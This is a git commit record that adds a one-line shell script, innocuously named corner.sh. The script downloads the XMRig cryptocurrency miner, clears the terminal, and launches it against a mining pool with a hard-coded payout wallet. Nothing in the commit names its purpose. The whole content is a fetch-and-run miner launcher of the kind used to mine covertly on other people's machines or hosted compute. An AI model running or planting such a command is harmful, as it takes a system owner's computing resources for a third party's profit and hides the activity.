acf37d0204fae6b605ffc81896b52d0dc4f46d25
vikram5542 <111926943+vikram5542@users.noreply.github.com>
2022-08-24 04:00:18 +0530

    Create corner.sh

---
+++ corner.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TTLbjDtRz6xmAJyBUKF17SbaFMiY9PMhnC -p x
